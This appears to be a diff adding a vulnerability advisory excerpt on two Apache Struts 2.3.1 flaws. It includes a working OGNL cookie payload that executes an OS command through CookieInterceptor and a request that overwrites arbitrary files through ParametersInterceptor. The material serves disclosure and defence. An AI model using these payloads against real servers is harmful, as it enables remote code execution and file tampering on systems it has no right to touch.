@@ -1,0 +1,29 @@
+1.) Remote command execution in Struts <= 2.3.1 (CookieInterceptor)
+
+Given struts.xml is configured to handle all cookie names (independent
+of limited cookie values):
+  <action name="Test" class="example.Test">
+    <interceptor-ref name="cookie">
+      <param name="cookiesName">*</param>
+      <param name="cookiesValue">1,2</param>
+    </interceptor-ref>
+    <result ...>
+  </action>
+
+The following HTTP header will execute an OS command when sent to
+Test.action:
+  Cookie:  (#_memberAccess["allowStaticMethodAccess"]\u003dtrue)(x)=1;
+  x[@java.lang.Runtime@getRuntime().exec('calc')]=1
+
+
+2.) Arbitrary File Overwrite in Struts <= 2.3.1 (ParametersInterceptor)
+
+Given Test.java has an uninitialized property "name" of type String:
+  String name; // +getter+setter
+
+The following request will create/overwrite the file
+"C:/sec-consult.txt" (empty file):
+  /Test.action?name=C:/sec-consult.txt&x[new+java.io.FileWriter(name)]=1
+  
+The existence of the property 'x' used in these examples is of no
+importance.
